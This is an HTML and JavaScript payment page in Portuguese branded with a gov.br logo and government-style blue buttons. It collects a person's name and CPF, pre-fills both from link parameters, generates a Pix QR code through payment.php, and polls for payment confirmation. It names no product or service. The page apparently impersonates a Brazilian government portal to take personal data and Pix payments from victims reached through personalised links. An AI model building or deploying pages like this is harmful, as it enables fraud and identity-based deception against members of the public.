<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Finalizar Pagamento</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">

  <style>
    .bg-green-600 {
      background-color: #1351b4;
      border-color: #1351b4;
    }

    .bg-green-600:hover {
      background-color: #1351b4;
      border-color: #1351b4;
    }
  </style>

  <!-- Topo com fundo preto e logo centralizada -->
  <header class="bg-black py-4" style="background-color: #ffffff; border-bottom: solid 1px #33333359;">
    <div class="container mx-auto text-center">
      <img src="govbr.webp" alt="Logo" class="h-10 mx-auto">
    </div>
  </header>

  <div class="container mx-auto px-4">
    <div class="max-w-md mx-auto bg-white shadow-md rounded p-6 mt-20">
      <h2 style="margin-bottom: 0.5em; text-transform: uppercase; font-weight: 400; font-size: 1.2em;" class="text-xl font-bold mb-4">Finalizar seu pagamento</h2>
      <hr>
      <form id="checkoutForm" class="space-y-4" style="margin-top: 1em;">
        <div>
          <label class="block text-sm font-medium text-gray-700">Nome completo</label>
          <input type="text" name="nome" id="nome" required class="mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring focus:ring-indigo-200 px-3 py-2 border">
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">CPF</label>
          <input type="text" name="cpf" id="cpf" required class="mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring focus:ring-indigo-200 px-3 py-2 border">
        </div>
        <button style="width: 100%; font-weight: 500; text-transform: uppercase;" id="submitBtn" type="submit" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 w-full">
          Realizar Pagamento
        </button>
      </form>
    </div>
  </div>

  <!-- Modal -->
  <div id="pixModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50" style="padding: 0em 0.6em">
    <div class="bg-white p-6 rounded shadow-lg w-full max-w-sm text-center space-y-4">

      
      <div class="space-y-2">
        <h3 class="text-xl font-bold text-green-600">✅ Pagamento gerado</h3>
        <p class="text-gray-700 text-sm">Use o QR Code abaixo<br>para realizar o pagamento via Pix.</p>
      </div>

      <hr>

      <img id="qrImage" src="" alt="QR Code Pix" class="mx-auto w-48 h-48">
      
      <input id="pixCode" readonly class="w-full text-sm border rounded px-3 py-2 text-center" />

      <button style="width: 100%; font-weight: 500; text-transform: uppercase;" onclick="copiarPix()" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 w-full">
        📋 Copiar código Pix
      </button>
      
      <button onclick="fecharModal()" class="text-sm text-gray-500 mt-2">Fechar</button>
    </div>
  </div>


  <script>
    // Função para pegar parâmetros da URL
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Função para aplicar máscara de CPF (###.###.###-##)
    function aplicarMascaraCPF(cpf) {
      return cpf
        .replace(/\D/g, '')                      // Remove tudo que não é número
        .replace(/(\d{3})(\d)/, '$1.$2')         // Adiciona ponto depois do terceiro dígito
        .replace(/(\d{3})(\d)/, '$1.$2')         // Adiciona ponto depois do sexto dígito
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');  // Adiciona traço nos dois últimos
    }

    // Aplica a máscara ao digitar
    const cpfInput = document.getElementById('cpf');
    cpfInput.addEventListener('input', function () {
      this.value = aplicarMascaraCPF(this.value);
    });

    // Preenche os campos se houver parâmetros na URL
    window.addEventListener('DOMContentLoaded', () => {
      const nome = getQueryParam('nome');
      const cpf = getQueryParam('cpf');

      if (nome) document.getElementById('nome').value = decodeURIComponent(nome);
      if (cpf) cpfInput.value = aplicarMascaraCPF(cpf);
    });


    const form = document.getElementById('checkoutForm');
    const modal = document.getElementById('pixModal');
    const qrImage = document.getElementById('qrImage');
    const pixCode = document.getElementById('pixCode');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      submitBtn.disabled = true;
      submitBtn.innerText = 'Processando...';

      const nome = document.getElementById('nome').value;
      const cpf = document.getElementById('cpf').value;

      try {
        const response = await fetch('payment.php', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ nome, cpf })
        });

        const json = await response.json();

        if (json.success) {
          qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(json.qrCode)}`;
          pixCode.value = json.qrCode;
          modal.classList.remove('hidden');

          // 🟡 Salvar retorno do setInterval
          const interval = setInterval(async () => {
            try {
              const response = await fetch('verificar-status.php', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({ orderId: json.orderId })
              });

              const result = await response.json();
              const status = result?.status?.toLowerCase();

              console.log(`🔄 Status do pedido ${json.orderId}:`, status);

              if (status === 'paid') {
                console.log('✅ Pagamento confirmado!');

                // Criar o alerta
                const alerta = document.createElement('div');
                alerta.className = 'absolute top-5 right-5 bg-green-600 text-white px-4 py-2 rounded shadow z-50 animate-bounce';
                alerta.innerText = '✅ Pagamento confirmado com sucesso!';

                // Adiciona ao body
                document.body.appendChild(alerta);

                // Remove após 5 segundos
                // setTimeout(() => {
                //   alerta.remove();
                // }, 5000);

                clearInterval(interval);
                if (typeof onSuccess === 'function') onSuccess();
              }


            } catch (error) {
              console.error('❌ Erro ao verificar status:', error);
            }
          }, 5000);

        } else {
          alert('Erro ao gerar pagamento.');
        }
      } catch (error) {
        alert('Erro de conexão com o servidor.');
      }

      submitBtn.disabled = false;
      submitBtn.innerText = 'Realizar Pagamento';
    });

    function copiarPix() {
      navigator.clipboard.writeText(pixCode.value).then(() => {
        alert('Código Pix copiado!');
      });
    }

    function fecharModal() {
      modal.classList.add('hidden');
    }
  </script>

</body>
</html>
